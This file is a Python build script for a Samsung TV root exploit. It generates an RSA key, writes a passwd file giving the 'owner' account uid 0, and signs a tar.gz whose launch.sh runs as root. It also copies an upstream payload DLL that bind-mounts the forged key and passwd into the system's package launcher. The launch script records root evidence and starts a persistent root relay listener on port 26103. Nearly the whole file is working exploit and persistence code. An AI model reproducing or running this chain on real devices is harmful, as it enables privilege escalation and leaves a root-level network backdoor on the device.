"""Build the boot agent's signed artifacts.

Produces art/: public.pem, passwd, <pkg>.tar.gz, <pkg>.tar.gz.signature, and
copies the archive-root payload (SamsungTvArchiveRoot.dll + runtimeconfig) from
the upstream build. The archive-root payload bind-mounts public.pem and passwd,
then hands the signed tar.gz to sdbd-tarlauncher, which runs launch.sh as uid 0.

Requirements:
- `openssl` on PATH (genpkey / pkey / dgst).
- The upstream samsung-tv-root payload built. Set PAYLOAD_DIR to its
  `payloads/common31/out` directory (default below).
"""
import io
import json
import os
import pathlib
import subprocess
import tarfile

HERE = pathlib.Path(__file__).resolve().parent
ART = HERE / "art"
PAYLOAD_DIR = pathlib.Path(
    os.environ.get(
        "PAYLOAD_DIR",
        str(HERE.parents[3] / "payloads" / "common31" / "out"),
    )
)
PKG = "archive-root-00b0000000000001"

LAUNCH = """#!/bin/sh
exec 2>&1
LOG=/home/owner/share/tmp/selfroot-relay/launch.log
mkdir -p /home/owner/share/tmp/selfroot-relay

# The TPK can be triggered more than once per boot, and the payload runs
# launch.sh more than once per trigger; make the whole pass idempotent.
if ! mkdir /run/selfroot-launch.lock 2>/dev/null; then
  echo "already applied this boot; skipping" >>"$LOG"
  exit 0
fi

{
  echo "SELFROOT uid=$(id -u) gid=$(id -g)"
  date
} > /home/owner/share/tmp/selfroot-evidence.txt
chmod 666 /home/owner/share/tmp/selfroot-evidence.txt

# Re-assert permissions every boot so a manual chmod cannot drift.
# art/ stays world-readable: the TPK copies it before escalating.
chmod 755 /opt/usr/share/selfroot /opt/usr/share/selfroot/art 2>/dev/null
chmod 700 /opt/usr/share/selfroot/relay 2>/dev/null
chmod 644 /opt/usr/share/selfroot/art/* 2>/dev/null
chmod 600 /opt/usr/share/selfroot/token 2>/dev/null

# Bound the persistent logs: one 1 MiB rolled generation per file.
rotate_log() {
  f="$1"
  [ -f "$f" ] || return 0
  sz=$(wc -c <"$f" 2>/dev/null || echo 0)
  if [ "$sz" -gt 1048576 ]; then
    mv -f "$f" "$f.1" 2>/dev/null
    : >"$f"
  fi
}
for f in /home/owner/share/tmp/selfroot-agent.log /home/owner/share/tmp/selfroot-stub.log /home/owner/share/tmp/selfroot-relay/relay.log "$LOG"; do
  rotate_log "$f"
done

# Management channel first. The relay is single-instance, so a duplicate start
# exits instead of leaving a second listener behind.
nohup /usr/bin/dotnet /opt/usr/share/selfroot/relay/RootRelay.dll 26103 \\
  /opt/usr/share/selfroot/token </dev/null \\
  >>/home/owner/share/tmp/selfroot-relay/relay.log 2>&1 &
echo "relay requested" >>"$LOG"
echo started
"""


def run(*args):
    r = subprocess.run(["openssl", *args])
    if r.returncode != 0:
        raise SystemExit(f"openssl failed: {args} -> {r.returncode}")


ART.mkdir(parents=True, exist_ok=True)
key = ART / "pinned-private.pem"   # generated fresh; do not commit
pub = ART / "public.pem"
archive = ART / f"{PKG}.tar.gz"
signature = ART / f"{PKG}.tar.gz.signature"

if not key.exists():
    run("genpkey", "-algorithm", "RSA", "-pkeyopt", "rsa_keygen_bits:2048", "-out", str(key))
run("pkey", "-in", str(key), "-pubout", "-out", str(pub))
(ART / "passwd").write_text("owner:x:0:0:owner:/home/owner:/bin/sh\n", encoding="ascii")

with tarfile.open(archive, "w:gz") as tar:
    info = tarfile.TarInfo("launch.sh")
    data = LAUNCH.encode()
    info.size = len(data)
    info.mode = 0o755
    info.mtime = 0
    tar.addfile(info, io.BytesIO(data))

run("dgst", "-sha256", "-sign", str(key), "-out", str(signature), str(archive))
run("dgst", "-sha256", "-verify", str(pub), "-signature", str(signature), str(archive))

for name in ("SamsungTvArchiveRoot.dll",):
    (ART / name).write_bytes((PAYLOAD_DIR / name).read_bytes())

(ART / "SamsungTvArchiveRoot.runtimeconfig.json").write_text(
    json.dumps({
        "runtimeOptions": {
            "tfm": "netcoreapp3.1",
            "framework": {"name": "Microsoft.NETCore.App", "version": "3.1.0"},
        }
    }) + "\n",
    encoding="ascii",
)

print("artifacts:", sorted(p.name for p in ART.iterdir()))
